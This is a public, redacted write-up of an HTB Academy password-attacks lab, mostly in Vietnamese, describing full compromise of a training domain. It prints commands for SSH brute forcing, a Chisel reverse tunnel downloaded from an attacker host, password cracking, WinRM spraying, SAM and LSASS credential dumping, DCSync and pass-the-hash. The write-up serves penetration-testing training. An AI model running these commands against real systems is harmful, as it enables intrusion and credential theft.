---
title: "HTB Academy Password Attacks Skill Assessment — Public Write-up"
date: 2026-04-26 10:10:00 +0700
categories: [HTB_CPTS, Skill Assessment, Password Attacks]
tags: [htb-academy, cpts, password-attacks, hydra, hashcat, netexec, evil-winrm, dcsync]
description: "Public-safe write-up for HTB Academy Password Attacks skill assessment."
pin: false
math: false
mermaid: true
---

> **Public note:** Đây là phiên bản portfolio đã được redact. IP nội bộ, flags, passwords và hashes đã được thay bằng placeholder để tránh lộ đáp án/lab spoiler trực tiếp. Nội dung tập trung vào methodology, attack chain và key takeaways.

## Nexura LLC — Full Domain Compromise

> **Mục tiêu:** Xâm nhập mạng Nexura LLC, leo thang đặc quyền và chiếm quyền kiểm soát Domain Controller (DC01).

---
## Scope

|Host|IP|Role|
|---|---|---|
|DMZ01|<TARGET_IP> (External), <DMZ_INTERNAL_IP> (Internal)|Linux pivot host|
|JUMP01|<JUMP01_IP>|Windows jump host|
|FILE01|<FILE01_IP>|Windows file server|
|DC01|<DC01_IP>|Windows Domain Controller|

**Domain:** `nexura.htb` **Target user:** Betty Jayde — known password `<REDACTED_PASSWORD>` reused across sites

---
## Phase 1 — Initial Access (DMZ01)

### Username Enumeration

```bash
username-anarchy "Betty Jayde" > betty_users.txt
```

### SSH Brute Force với Hydra

```bash
hydra -L betty_users.txt -p '<REDACTED_PASSWORD>' ssh://<TARGET_IP>
```

**Kết quả:**

```
[22][ssh] host: <TARGET_IP>  login: jbetty  password: <REDACTED_PASSWORD>
```

**Credential #1:** `jbetty:<REDACTED_PASSWORD>`

---
## Phase 2 — Pivoting vào Internal Network (Chisel Reverse Tunnel)

### Cơ chế hoạt động

```
Attack Host (Chisel Server :8080) <──── DMZ01 (Chisel Client)
       SOCKS5 :1080
          ↓
    Proxychains → 172.16.119.0/24
```

### Setup trên Attack Host

```bash
sudo chisel server --reverse
# Listening on :8080, SOCKS5 mở tại 127.0.0.1:1080
```

### Upload và chạy Chisel trên DMZ01

```bash
# Attack host host file
python3 -m http.server 8888

# DMZ01 download
wget http://<ATTACK_IP>:8888/chisel -O /tmp/chisel
chmod +x /tmp/chisel
/tmp/chisel client <ATTACK_IP>:8080 R:socks
# client: Connected ✅
```

### Cấu hình Proxychains

```
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080
```

### Kết quả recon internal

```bash
proxychains nxc smb <FILE01_IP> <DC01_IP>
```

```
DC01   <DC01_IP> — nexura.htb — SMB signing: True
FILE01 <FILE01_IP> — nexura.htb — SMB signing: False
JUMP01 <JUMP01_IP>  — WinRM open (port 5985)
```

---
## Phase 3 — Credential Discovery trên DMZ01 

## Trên Linux của jbetty
### Recon bash_history

```bash
cat ~/.bash_history
```

**Phát hiện:**

```bash
sshpass -p "<REDACTED_PASSWORD>" ssh hwilliam@file01
```

**Credential #2:** `hwilliam:<REDACTED_PASSWORD>`

---
## Phase 4 — File Share Enumeration (FILE01)

### Spider shares với NetExec

```bash
proxychains nxc smb <FILE01_IP> \
  -u hwilliam -p '<REDACTED_PASSWORD>' \
  -M spider_plus
```

**Shares có quyền đọc:**

```
HR        READ,WRITE
PRIVATE   READ,WRITE
TRANSFER  READ,WRITE
```

**File nhạy cảm phát hiện trong HR/Archive:**

```
Employee-Passwords_OLD.psafe3
Employee-Passwords_OLD.plk
Employee-Passwords_OLD_011.ibak
```

### Download file Password Safe

```bash
proxychains smbclient //<FILE01_IP>/HR \
  -U 'nexura.htb/hwilliam%<REDACTED_PASSWORD>'

cd Archive
get "Employee-Passwords_OLD.psafe3"
```

### Crack master password với Hashcat

```bash
hashcat -m 5200 Employee-Passwords_OLD.psafe3 /usr/share/wordlists/rockyou.txt
```

**Kết quả:**

```
Employee-Passwords_OLD.psafe3:<REDACTED_MASTER_PASSWORD>
```

### Mở database với PasswordSafe

Mở bằng `passwordsafe` hoặc `keepassxc`, nhập master password `<REDACTED_MASTER_PASSWORD>`.

**Credentials từ psafe3:**

|Username|Full Name|Password|
|---|---|---|
|bdavid|David Brittni|`<REDACTED_PASSWORD>`|
|stom|Tom Sandy|`<REDACTED_PASSWORD>`|
|hwilliam|William Hallam|`<REDACTED_PASSWORD>` (OLD)|

---
## Phase 5 — Lateral Movement vào JUMP01

### Credential Spraying

```bash
echo -e "bdavid\nstom\nhwilliam" > users.txt
echo -e "<REDACTED_PASSWORD>\n<REDACTED_PASSWORD>\n<REDACTED_PASSWORD>\n<REDACTED_PASSWORD>" > passwords.txt

proxychains nxc winrm <JUMP01_IP> <FILE01_IP> <DC01_IP> \
  -u users.txt -p passwords.txt --continue-on-success
```

**Kết quả:**

```
JUMP01  bdavid:<REDACTED_PASSWORD>  (Pwn3d!) ✅
JUMP01  hwilliam:<REDACTED_PASSWORD>  (Pwn3d!) ✅
```

### Shell vào JUMP01

```bash
proxychains evil-winrm -i <JUMP01_IP> \
  -u bdavid -p '<REDACTED_PASSWORD>'
```

---
## Phase 6 — Credential Dumping trên JUMP01

### Dump SAM + SYSTEM + SECURITY

```powershell
reg save HKLM\SAM      C:\Windows\Temp\sam.save
reg save HKLM\SECURITY C:\Windows\Temp\security.save
reg save HKLM\SYSTEM   C:\Windows\Temp\system.save

download sam.save
download security.save
download system.save
```

```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

**Kết quả SAM:**

```
Administrator:500:<REDACTED_NTLM_HASH>
```

### Dump LSASS

```powershell
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full
download lsass.dmp
```

```bash
pypykatz lsa minidump lsass.dmp
```

**Kết quả LSASS — Plaintext credential:**

```
Username: stom
Domain:   NEXURA.HTB
Password: <REDACTED_PASSWORD>   ← plaintext từ Kerberos session!
NT Hash:  <REDACTED_NTLM_HASH>
```

**Credential #5:** `stom:<REDACTED_PASSWORD>`

---

## Phase 7 — Domain Controller Compromise

### WinRM vào DC01

```bash
proxychains nxc winrm <DC01_IP> \
  -u stom -p '<REDACTED_PASSWORD>'
# WINRM DC01 [+] nexura.htb\stom:<REDACTED_PASSWORD> (Pwn3d!) ✅
```

### DCSync — Dump toàn bộ NTDS.dit

```bash
proxychains nxc smb <DC01_IP> \
  -u stom -p '<REDACTED_PASSWORD>' --ntds
```

**Kết quả:**

|Account|NT Hash|
|---|---|
|**Administrator**|`<REDACTED_NTLM_HASH>`|
|krbtgt|`<REDACTED_NTLM_HASH>`|
|bdavid|`<REDACTED_NTLM_HASH>`|
|stom|`<REDACTED_NTLM_HASH>`|
|hwilliam|`<REDACTED_NTLM_HASH>`|

### Verify Domain Admin

```bash
proxychains nxc smb <DC01_IP> \
  -u Administrator \
  -H <REDACTED_NTLM_HASH>
```

---

## Full Attack Chain

```
[Internet]
    └── Hydra SSH Brute Force (Username-Anarchy wordlist)
        └── DMZ01 ← jbetty:<REDACTED_PASSWORD>
            ├── Chisel Reverse Tunnel → 172.16.119.0/24
            └── bash_history → hwilliam:<REDACTED_PASSWORD>
                └── FILE01 SMB (HR/Archive share)
                    └── Employee-Passwords_OLD.psafe3
                        └── Hashcat crack → <REDACTED_MASTER_PASSWORD>
                            └── bdavid:<REDACTED_PASSWORD>
                                └── JUMP01 WinRM (Pwn3d!)
                                    ├── SAM dump → Local Admin hash
                                    └── LSASS dump → stom:<REDACTED_PASSWORD>
                                        └── DC01 WinRM (Pwn3d!)
                                            └── DCSync → All Domain Hashes
                                                └── 👑 DOMAIN ADMIN
```

---

## Credential Summary

| #   | Username      | Password / Hash                    | Source            | Used for       |
| --- | ------------- | ---------------------------------- | ----------------- | -------------- |
| 1   | jbetty        | `<REDACTED_PASSWORD>`                      | Hydra brute force | SSH → DMZ01    |
| 2   | hwilliam      | `<REDACTED_PASSWORD>`              | bash_history      | SMB → FILE01   |
| 3   | bdavid        | `<REDACTED_PASSWORD>`            | psafe3 database   | WinRM → JUMP01 |
| 4   | stom          | `<REDACTED_PASSWORD>`            | psafe3 database   | — (old)        |
| 5   | stom          | `<REDACTED_PASSWORD>`            | LSASS dump        | WinRM → DC01   |
| 6   | Administrator | `<REDACTED_NTLM_HASH>` | DCSync            | Domain Admin   |
|     |               |                                    |                   |                |

---
